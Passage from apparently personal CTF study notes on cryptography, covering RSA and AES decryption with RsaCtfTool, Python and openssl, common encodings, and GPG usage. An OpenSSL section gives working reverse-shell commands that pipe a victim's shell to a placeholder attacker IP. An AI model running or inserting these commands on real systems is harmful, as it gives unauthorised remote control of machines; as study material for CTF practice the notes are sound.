								MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAIw/U51Fghh6WumZQjg9l3a6AjFZ+xm2
								x2+9ja+8n8Yg95Hbxsp9vCpwlIol1A5wMo6p/hNlxzAE3/cY08eKzDMCAwEAAQ==
								-----END PUBLIC KEY-----
						Private Key => array(n, d)
							Example:
								-----BEGIN RSA PRIVATE KEY-----
								MIIBOQIBAAJBAIw/U51Fghh6WumZQjg9l3a6AjFZ+xm2x2+9ja+8n8Yg95Hbxsp9
								vCpwlIol1A5wMo6p/hNlxzAE3/cY08eKzDMCAwEAAQJAJearQxJYwSK31O9dDPPg
								Le7AzvOBP4a8yP7R/o8cIp+3XdCXzuUreFzTWTXIg76tohg8cQb77HT/jVo2rLXa
								AQIhAOrtFkJ0So2NZIp4xBPLqFozaSJNti8Yx8w1IOWoS2szAiEAmNQCPrBaB6p4
								heIDYgaTYpJa4gbw3tLe82AAKzFLGwECIE/ZA37Uzd4s16ZlA6gCyZbW8H3zUd/S
								GV6kFClauT+XAiBZuddbkNQ6vfYmvIw56Bxt+flLzMFsQSfOgaV3tmgfAQIgKW7C
								LI1+rBn3TvmyLMZ7+3TEtVeTVRgabLWyOUjmv7w=
								-----END RSA PRIVATE KEY-----					
					We use a script which applies RSA algorithm on the plaintext and gives us a pair of keys and the ciphertext.
					Functions used 	to encrypt/decrypt:
						Encryption => c = pow(m,e)%n
						Decryption => m = pow(c,d)%n
				Exploitation:
					Getting plaintext from encrypted text
					RsaCtfTool:(https://github.com/Ganapati/RsaCtfTool)
						./RsaCtfTool.py -n modulus -e public_exponent --uncipher cipher_text
						./RsaCtfTool.py -n modulus -e public_exponent --uncipherfile cipher_text.enc
						./RsaCtfTool.py --publickey key.pub --uncipher cipher_text
					rsatool:
						https://github.com/ius/rsatool
				Special Case:(Weird RSA)
					Its possible that we may get keys "dp" and "dq" along with c,p,q. Now these keys are actually used in Chinese Remainder algorithm, which is used as the algorithm in many popular crypto libraries, due to it's efficiency.
					https://github.com/zionspike/ctf-writeup/blob/master/Crypto/%5BpicoCTF%202017%5D%20-%20Weird%20RSA%20-%2090/kapi-note.md => script to get plaintext
				used in HTB::Brainfuck
		Symmetric Encryption:
			AES In CTF:
				Basics:
					a.k.a. Rijndael after its creators
					It was a replacement for DES which had short keys and other cryptographic flaws.
					AES is a Symmetric encryption algorithm, so it has only key:
						Key size => 16 bytes => 16 characters long
					Types:(Bassed on Key Size)
						AES-128:
							Less Secure
							Normal System performance
						AES-256:
							More Secure
							Decreased System performance
				Exploitation:
					AES[CBC]:(used in HTB::Laser)
						The IV is the last 16 bytes appended
						script to decrypt the ciphertext using symmetric key:
							#!/usr/bin/env python3
							import base64
							from Crypto.Cipher import AES
							with open("cipher_text.enc","r") as q64:
							    q = base64.b64decode(q64.read())
							    non_junk = q[8:]#First 8 bytes are junk
							    iv = non_junk[:16]#The IV is the last 16 bytes appended
							    ct = non_junk[16:]#The ciphertext is everything not junk and not IV
							    cipher = AES.new('symmetric_key_value', AES.MODE_CBC, iv)
							    pt = cipher.decrypt(ct)
							    with open('output', 'wb') as out:
							        out.write(pt)
						Using openssl:
							Without iv:
								openssl aes-256-cbc -a -salt -in plaintext.txt -out ciphertext.enc -k password =>  encrypt
								openssl aes-256-cbc -d -a -in ciphertext.enc -out decryted.txt -k password => decrypt
							With iv:
								openssl enc -aes-256-cbc -nosalt -e plaintext.txt -out ciphertext.enc -K 'key_hex' -iv '5a04ec902686fb05a6b7a338b6e07760' => encrypt
								openssl enc -aes-256-cbc -nosalt -d -in ciphertext.enc -out decryted.txt -K 'key_hex' -iv '5a04ec902686fb05a6b7a338b6e07760' => decrypt
									flags:
										-k value => symmetric key value in ascii
										-K value => symmetric key value in hex(used with -iv)
					AES[ECB]:
					AES[CTR]:
				Note:
					Printers encrypt jobs while they are on the printer using AES-128 or AES-256, so if we find any printer jobs on the printer on a ctf, then we should crack it
			DES In CTF:
				Basics:
					It uses DEA cipher
	Attacking Encodings:
		Basics:
			Encoding is a form of data representation in some format
		File Encodings:
			Binary:(base2)
			Octal:(base8)
			Hexadecimal:(base16)
				echo -n "string" | xx -r -ps => decode	
			Base32:
				characterset: A–Z and 2–7 (26 + 6 = 32)
			Base36:
				characterset: A–Z and 0–9
			Base58:
				characterset: 1-9 and A-Z(except I,O) and a-z (excpet l)
			Base62:
				characterset: A-Z and a-z and 0-9
			Base64:
				Theory:
					characterset: A-Z and a-z and 0-9 and + and /
					padding: = (padding is used to get a specific size od string)
						there may or may not be padding
				echo -n "string" | base64 -d => decode	
			Base85:(aka ASCII85)
				characterset: ASCII 33 (“!”) to ASCII 117 (‘u’)
		Web Encodings:
			URL Encoding:
				Capatilization doesnt matter
				\n => %0A or %0a
				\r => %0D or %0d
				%20 => encoded space
				meyerweb.com/eric/tools/dencoder/ => site for URL encoding/decoding
			HTML Encoding:
				Symbols are encoded by html to maintain security
				Double Quotes => " => &quot; or &#34;
				Single Quotes => ' => &apos; or &#39;
				Less than => < => &lt; or &#60;
				Greater than => > => &gt; or &#62;
				Note:
					&#<ASCII value of symbol>;
			Double Encoding:
	Important Tools:
		OpenSSL:
			Basics:
			Usage:
				AES[CBC]:
					Without iv:
						openssl aes-256-cbc -a -salt -in plaintext.txt -out ciphertext.enc -k password =>  encrypt
						openssl aes-256-cbc -d -a -in ciphertext.enc -out decryted.txt -k password => decrypt
					With iv:
						openssl enc -aes-256-cbc -nosalt -e plaintext.txt -out ciphertext.enc -K 'key_hex' -iv '5a04ec902686fb05a6b7a338b6e07760' => encrypt
						openssl enc -aes-256-cbc -nosalt -d -in ciphertext.enc -out decryted.txt -K 'key_hex' -iv '5a04ec902686fb05a6b7a338b6e07760' => decrypt
				Reverse Shell:
					Kali> openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes => generate keys
					Kali> openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT> => attacker
					Victim:
						Windows:
							openssl s_client -quiet -connect <ATTACKER-IP>:<PORT> | CMD.exe
						Linux:
							mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -connect <ATTACKER-IP>:<PORT> > /tmp/s 2> /dev/null; rm /tmp/s
				Flags:
					req => certificate request and certificate generating utility
					enc => 
					aes-256-cbc
					rsa:4096
					s_server => generic SSL/TLS server which listens for connections on a given port using SSL/TLS.
					s_client => generic SSL/TLS client which connects to a remote host using SSL/TLS.
					-in => input file
					-out => output file
					-keyout <file> => send key to <file>
					-e
					-d
					-x509 => output a x590 cert instead of a certificate request
					-newkey
					-key
					-cert => certificate file to use
					-days x => number of days cert is valid for
					-nodes => don’t encrypt the output key
					-quiet
					-connect => IP and Port for where to connect to
					-port =>  TCP/IP port to listen on for connections(default => 4433)
					-a
					-salt
					-nosalt
					-k value => symmetric key value in ascii
					-iv 'value' =>
					-K value => symmetric key value in hex(used with -iv)
		PGP:(Pretty Good Privacy)
			Basics:	
				PGP is based on OpenGPG Standards and uses a combination of:
					SHA-1 (Hashing)
					ZIP (Compression)
					3DES, IDEA, CAST-128 (Symmetric-Key Cryptography)
					RSA, DSS, Diffie-Hellman (Asymmetric-Key Cryptography)
				Applications:
					Encrypting and decrypting texts/e-mails/files/directories/whole disk partitions
					Digital Signatures
					Security of e-mail communication
			GPG:(GnuPG)(apt-get install gnupg2)(CLI)
				Basics:
					Its an Open Source implementation of PGP. It means we use GPG software to implement PGP
					File Formats:(3)
						A. .gpg:
						B. .asc:
							ASCII-armored signature with or without wrapped document, plain text format
						C. .sig:
							GPG signed document file, binary format
				Usage:
					To Generate a new key pair:
						gpg --full-gen-key
						We can decide how many bits and what algorithm we want and then enterkey_id/user_id(email/name) and passphrase
						More bits => More Secure
						Note:
							 This is the first step for implementing PGP encryption
					List keys:
						gpg --list-keys
					To import someone's public key:
						save key as key.asc
						gpg --import key.asc
					Show our public key:
						gpg --armor --export key_id
						Note:
							key_id is the email we entered during key-pair generation
					Export our public key:
						gpg --armor --export key_id > pub_key.asc
						Note:
							key_id is the email we entered during key-pair generation
					Export our secret(private) key:
						gpg --armor --export-secret-key key_id > secret_key.asc
						Note:
							key_id is the email we entered during key-pair generation
					Encrypt file:
						Armored:
							gpg  -r key_id -e --sign --armor file.txt > file.asc
						Unarmored:
							gpg  -r key_id -e file.txt > file.gpg
						Note:
							key_id is the email we entered during key-pair generation
					Convert .asc to .gpg:
						gpg --dearmor file.asc > file.gpg
					Decrypt file:
						gpg -d file.asc
					To output to a file:
						gpg -esa -r key_id --set-filename new_filename.txt current_filename.txt > new_filename.asc
						Note:
							key_id is the email we entered during key-pair generation
					Flags:
						-r => recepient(key_id/user_id)
						-e => --encrypt => to encrypt a file
						-d => --decrypt => to decrypt a file
						--armor => This option takes output from commands and prints it in format(.asc) that can be safely e-mailed.
						--dearmor => It is used to convert .asc to .gpg
			KGPG:(apt-get install kgpg)(GUI)
				Basics:
				Usage:
					kgpg => Key Management window will open
					To encrypt the message, go to:
						File > Open Editor
						enter text
						Options > Allow encryption with untrusted keys
						Encrypt to the public key of your choice. This should be your recipient's key
						After clicking OK and entering your password, the encrypted message should appear
					To decrypt a message:
						File > Open Editor
						paste the encrypted message in the box and click Decrypt
						enter your password, the message should dispay in plain text